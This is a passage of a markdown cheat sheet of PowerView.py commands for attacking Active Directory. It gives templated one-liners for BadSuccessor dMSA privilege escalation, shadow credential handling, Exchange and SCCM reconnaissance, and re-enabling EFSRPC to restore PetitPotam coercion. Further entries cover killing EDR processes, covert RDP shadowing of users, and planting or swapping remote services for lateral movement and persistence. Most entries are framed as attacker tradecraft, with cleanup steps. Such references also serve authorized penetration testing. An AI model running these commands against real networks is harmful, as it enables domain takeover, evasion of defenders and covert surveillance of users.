-->

### Remove gMSA

Removes a group-managed service account. Cleanup primitive.

```sh title:"PowerView.py Delete gMSA, cleanup primitive"
Remove-DomainGMSA -Identity $name
```
<!-- cheat
var name --- --header "gMSA to remove"
-->

### Add dMSA

Creates a dMSA, optionally tied to a victim user via `SupersededAccount`. Building block for BadSuccessor-style attacks.

```sh title:"PowerView.py Create dMSA, optionally supersede victim"
Add-DomainDMSA -Identity $name -SupersededAccount $victim
```
<!-- cheat
var name --- --header "New dMSA name"
var victim --- --header "Account to be superseded"
-->

### Remove dMSA

Removes a delegated managed service account. Cleanup primitive.

```sh title:"PowerView.py Delete dMSA, cleanup primitive"
Remove-DomainDMSA -Identity $name
```
<!-- cheat
var name --- --header "dMSA to remove"
-->

### BadSuccessor (dMSA escalation)

Exploits the dMSA successor relationship by superseding a high-value account with an attacker-controlled dMSA. Privesc against vulnerable forests.

```sh title:"PowerView.py dMSA supersession privesc against vulnerable forests"
Invoke-BadSuccessor -DMSAName "$dmsa" -TargetIdentity "$target"
```
<!-- cheat
var dmsa --- --header "Attacker-controlled dMSA (e.g. evil_dmsa)"
var target --- --header "Target identity (e.g. Domain Admins)"
-->

## Shadow Credentials Extras

### List shadow credential device IDs

Reads existing `KeyCredentialLink` entries so you can pick a specific Device ID for surgical removal.

```sh title:"PowerView.py Enumerate KeyCredentialLink Device IDs for cleanup"
Set-ShadowCredential -Identity $target -List
```
<!-- cheat
var target --- --header "Target identity"
-->

### Remove specific shadow credential

Removes a single key credential by its Device ID. Surgical cleanup after abuse.

```sh title:"PowerView.py Remove one key credential by Device ID"
Remove-ShadowCredential -Identity $target -DeviceId $deviceid
```
<!-- cheat
var target --- --header "Target identity (e.g. DC01$)"
var deviceid --- --header "Device ID GUID"
-->

### Clear all shadow credentials

Wipes every `msDS-KeyCredentialLink` entry. Careful - also removes legitimate Windows Hello entries.

```sh title:"PowerView.py Wipe all KeyCredentialLink (also kills Windows Hello)"
Remove-ShadowCredential -Identity $target -All
```
<!-- cheat
var target --- --header "Target identity"
-->

## Exchange

### List Exchange servers

Enumerates Exchange servers and runs a vulnerability check. Fast way to find high-value Exchange targets.

```sh title:"PowerView.py Exchange servers + vuln check"
Get-ExchangeServer -Properties cn,serialNumber
```
<!-- cheat -->

### List mailboxes

Enumerates Exchange mailboxes, optionally filtered to a specific identity. Maps mailbox-to-user relationships.

```sh title:"PowerView.py Map mailbox-to-user relationships"
Get-ExchangeMailbox -Identity $identity
```
<!-- cheat
var identity --- --header "Mailbox identity (e.g. administrator)"
-->

### List Exchange databases

Lists Exchange databases. Useful for incident scoping and locating mailbox stores.

```sh title:"PowerView.py Exchange databases for mailbox-store recon"
Get-ExchangeDatabase
```
<!-- cheat -->

## Coercion Extras

### Enable EFSRPC

Enables the EFS RPC interface on a remote host - opens the PetitPotam coercion surface. Use when hardening has turned it off.

```sh title:"PowerView.py Turn EFSRPC back on (PetitPotam surface)"
Enable-EFSRPC -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer (e.g. DC01)"
-->

## Misc

### Resolve SID

Resolves a SID into its principal name. Quick helper when reading raw ACL output.

```sh title:"PowerView.py SID -> principal name lookup"
ConvertFrom-SID -ObjectSID $sid
```
<!-- cheat
var sid --- --header "SID (e.g. S-1-5-21-xxx-512)"
-->

### Decode UAC value

Converts a `userAccountControl` integer into readable flags. Saves the constant-table lookup.

```sh title:"PowerView.py userAccountControl int -> readable flags"
ConvertFrom-UACValue -Value $value
```
<!-- cheat
var value --- --header "UAC value (e.g. 66048)"
-->

### Named pipes on host

Lists named pipes exposed by a remote host. Identifies interesting RPC services and EDR endpoints.

```sh title:"PowerView.py Remote named pipes, spot RPC services / EDR"
Get-NamedPipes -Computer $computer -Name $name
```
<!-- cheat
var computer --- --header "Target computer"
var name --- --header "Optional pipe name filter (e.g. sqlsvc)"
-->

### Local users on host

Reads the local user database from a remote computer via SAMR. Finds stale local accounts.

```sh title:"PowerView.py SAMR local user dump from remote host"
Get-LocalUser -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Logged-on (network) sessions

Pulls logged-on users from a remote computer via `NetWkstaUserEnum`. Complements `Get-NetSession`.

```sh title:"PowerView.py NetWkstaUserEnum-based logged-on users"
Get-NetLoggedOn -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Logged-on (registry)

Reads `HKU` over the wire to identify logged-on users by their loaded profile hive. Different vantage from `Get-NetLoggedOn`.

```sh title:"PowerView.py HKU-based logged-on users (different vantage)"
Get-RegLoggedOn -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Computer info

Retrieves OS and hardware details from a remote host via SMB. Sanity check before deeper interaction.

```sh title:"PowerView.py OS + hardware details via SMB"
Get-NetComputerInfo -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Terminal sessions

Lists RDP/console sessions on a remote computer. Pair with `Logoff-Session` for session management.

```sh title:"PowerView.py RDP/console session list on remote host"
Get-NetTerminalSession -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Disconnect terminal session

Tears down a specific terminal session on a remote host. Kicks an operator or clears a stale session.

```sh title:"PowerView.py Disconnect a specific session (kick operator)"
Remove-NetTerminalSession -Computer $computer -SessionId $sessionid
```
<!-- cheat
var computer --- --header "Target computer"
var sessionid --- --header "Session ID (integer)"
-->

### Log off session

Calls `WTSLogoffSession` on a remote host to forcibly log a user out. Aggressive but useful during takedown.

```sh title:"PowerView.py Force WTSLogoffSession on remote host"
Logoff-Session -Computer $computer -SessionId $sessionid
```
<!-- cheat
var computer --- --header "Target computer"
var sessionid --- --header "Session ID to log off"
-->

### Kill remote process

Stops a process on a remote host by PID. Useful against EDR or troublesome services.

```sh title:"PowerView.py Kill remote process by PID (EDR / nuisance svc)"
Stop-NetProcess -Computer $computer -Pid $pid
```
<!-- cheat
var computer --- --header "Target computer"
var pid --- --header "Target PID"
-->

### Shut down host

Issues a remote shutdown over SMB. Disruptive but legitimate maintenance primitive.

```sh title:"PowerView.py Remote shutdown over SMB"
Stop-Computer -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Restart host

Issues a remote reboot. Often used to apply changes that require a restart (e.g. RDP enable).

```sh title:"PowerView.py Remote reboot (apply RDP enable etc.)"
Restart-Computer -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Enable RDP

Enables Remote Desktop on a remote host via registry. Pair with a reboot to take effect.

```sh title:"PowerView.py Flip RDP on via registry (reboot to apply)"
Enable-RDP -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Disable RDP

Disables Remote Desktop on a remote host. Cleanup after RDP enable.

```sh title:"PowerView.py Flip RDP off, cleanup after enable"
Disable-RDP -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Enable Shadow RDP

Enables RDP shadowing so a remote session can be observed without prompting. Stealthy spy on interactive users.

```sh title:"PowerView.py RDP shadowing without prompt, stealth spy"
Enable-ShadowRDP -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Disable Shadow RDP

Disables RDP shadowing. Cleanup after Shadow RDP usage.

```sh title:"PowerView.py Turn off RDP shadowing, cleanup"
Disable-ShadowRDP -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Pop message box

Pops a Windows message box on a remote host's interactive session. Mostly exercise/check-in fodder.

```sh title:"PowerView.py Pop a message box on interactive session"
Invoke-MessageBox -Computer $computer -Title "$title" -Message "$message"
```
<!-- cheat
var computer --- --header "Target computer"
var title --- --header "Box title"
var message --- --header "Body text"
-->

### Add Windows service

Creates a service on a remote host pointing at a chosen binary. Classic lateral-movement and persistence primitive.

```sh title:"PowerView.py Plant remote service, lateral/persistence primitive"
Add-NetService -Computer $computer -Name $name -DisplayName "$display" -Path "$path"
```
<!-- cheat
var computer --- --header "Target computer"
var name --- --header "Service name"
var display --- --header "Display name"
var path --- --header "Binary path (e.g. C:\\svc.exe)"
-->

### Set service attributes

Updates an existing service's binary path, display name, or start type. Swap a service binary or disable defenders.

```sh title:"PowerView.py Rewrite service binary path / display / start type"
Set-NetService -Computer $computer -Name $name -Path "$path"
```
<!-- cheat
var computer --- --header "Target computer"
var name --- --header "Service name"
var path --- --header "New binary path"
-->

### Start service

Starts a Windows service on a remote host. Triggers binary execution after a service mod.

```sh title:"PowerView.py Start remote service, trigger swapped binary"
Start-NetService -Computer $computer -Name $name
```
<!-- cheat
var computer --- --header "Target computer"
var name --- --header "Service name"
-->

### Stop service

Stops a Windows service on a remote host. Mirror of `Start-NetService` for cleanup or attacker actions.

```sh title:"PowerView.py Stop remote service (cleanup / attacker action)"
Stop-NetService -Computer $computer -Name $name
```
<!-- cheat
var computer --- --header "Target computer"
var name --- --header "Service name"
-->

### Remove service

Deletes a Windows service on a remote host. Final cleanup after service abuse.

```sh title:"PowerView.py Delete remote service, final cleanup"
Remove-NetService -Computer $computer -Name $name
```
<!-- cheat
var computer --- --header "Target computer"
var name --- --header "Service name"
-->

### Kick SMB session

Removes a remote SMB session connected to a host. Kicks an operator off a share without rebooting.

```sh title:"PowerView.py Kick SMB session without rebooting host"
Remove-NetSession -Computer $computer -TargetSession "$session"
```
<!-- cheat
var computer --- --header "Target computer"
var session --- --header "Target session (e.g. \\\\10.10.10.5)"
-->

### SCCM enumeration

Looks for SCCM/MECM installations and runs reachable checks. Often-overlooked privesc surface.

```sh title:"PowerView.py Find SCCM/MECM + datalib reach check"
Get-DomainSCCM -CheckDatalib
```
<!-- cheat -->

### WDS enumeration

Finds Windows Deployment Services config in AD. WDS images and admin accounts are a recurring source of leaked secrets.

```sh title:"PowerView.py WDS config, recurring source of leaked secrets"
Get-DomainWDS
```
<!-- cheat -->
